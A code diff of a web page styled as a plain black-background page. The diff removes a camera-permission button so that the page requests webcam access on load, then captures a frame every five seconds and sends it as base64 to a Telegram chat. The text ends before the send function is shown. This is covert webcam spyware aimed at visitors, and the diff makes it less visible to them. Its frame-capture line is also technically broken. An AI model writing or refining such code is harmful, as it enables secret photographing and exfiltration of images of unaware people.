@@ -24,35 +24,32 @@
 </head>
 <body>
   <h1>Welcome to My Black Background Page</h1>
-  <button id="request-permission">Request Camera Permission</button>
   <script>
-    document.getElementById("request-permission").addEventListener("click", () => {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          // Camera ki permission mil gayi
-          console.log("Camera permission granted");
-          // Start taking photos
-          startTakingPhotos(stream);
-        })
-        .catch(error => {
-          // Camera ki permission nahi mili
-          console.error("Camera permission denied", error);
-        });
-    });
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        console.log("Camera permission granted");
+        startTakingPhotos(stream);
+      })
+      .catch(error => {
+        console.error("Camera permission denied", error);
+      });
 
     function startTakingPhotos(stream) {
       setInterval(() => {
-        // Camera ki photo click karna
         const canvas = document.createElement("canvas");
         canvas.width = 640;
         canvas.height = 480;
         const ctx = canvas.getContext("2d");
+        
+        // Capture the video frame
         ctx.drawImage(stream.getVideoTracks()[0].getSettings().facingMode === "user" ? stream.getVideoTracks()[0] : stream.getVideoTracks()[1], 0, 0, canvas.width, canvas.height);
-        // Photo ko base64 mein convert karna
+        
+        // Convert image to base64
         const photo = canvas.toDataURL();
-        // Photo ko Telegram chat ID par bhejna
+        
+        // Send photo to Telegram chat
         sendPhotoToTelegram(photo);
-      }, 5000); // 5 second
+      }, 5000); // 5 seconds
     }
 
     function sendPhotoToTelegram(photo) {
